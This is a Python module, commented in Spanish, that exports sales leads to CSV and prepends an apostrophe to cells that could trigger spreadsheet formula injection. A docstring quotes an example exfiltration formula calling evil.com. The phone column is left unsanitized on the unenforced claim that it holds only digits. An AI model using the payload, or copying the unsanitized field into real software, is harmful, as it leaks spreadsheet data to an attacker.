"""
Generación del CSV de leads en el servidor (stdlib puro, sin dependencias).

Antes el CSV se montaba en el navegador sobre los primeros 500 leads cargados,
cortando en silencio. Ahora lo genera el backend con TODOS los leads que
cumplen los filtros, respetando la visibilidad por agente.
"""

import csv
import io

COLUMNAS = ["Nombre", "Email", "Teléfono", "Clasificación", "Score", "Estado", "Origen", "Fecha", "Mensaje"]

# Caracteres con los que Excel/LibreOffice/Sheets interpretan una celda como
# el inicio de una fórmula (=, +, -, @) o como espacio/tab en algunos parsers.
_PREFIJOS_FORMULA = ("=", "+", "-", "@", "\t", "\r")


def _celda_segura(valor: str) -> str:
    """
    Antepone un apóstrofo si la celda empieza por un carácter que abriría una
    fórmula al abrir el CSV en una hoja de cálculo (CSV/Formula Injection).
    Estos campos vienen del formulario público SIN autenticar — un lead con
    name='=HYPERLINK("http://evil.com?"&A1)' ejecutaría esa fórmula al abrir
    el export en Excel.
    """
    if valor and valor[0] in _PREFIJOS_FORMULA:
        return "'" + valor
    return valor


def leads_to_csv(leads: list) -> str:
    """
    Convierte los leads a CSV. Empieza con BOM para que Excel detecte UTF-8
    (sin él, los acentos salen rotos al abrir el archivo con doble clic).
    """
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\r\n")
    writer.writerow(COLUMNAS)
    for l in leads:
        writer.writerow([
            _celda_segura(l.get("name") or ""),
            _celda_segura(l.get("email") or ""),
            # Teléfono SIN sanear: un número internacional legítimo empieza
            # casi siempre por "+" (ej. "+34 600 111 222") — es uno de los
            # prefijos de fórmula, así que sanearlo antepondría un apóstrofo
            # visible a la inmensa mayoría de los teléfonos reales. El resto
            # del valor son dígitos/espacios: no hay sintaxis de fórmula que
            # explotar aquí.
            l.get("phone") or "",
            l.get("classification") or "",
            l.get("score") if l.get("score") is not None else "",
            l.get("status") or "",
            l.get("source") or "",
            (l.get("created_at") or "")[:10],
            # Mensaje en una sola línea para no romper lectores de CSV básicos
            _celda_segura((l.get("message") or "").replace("\r\n", " ").replace("\n", " ").strip()),
        ])
    return "﻿" + buf.getvalue()
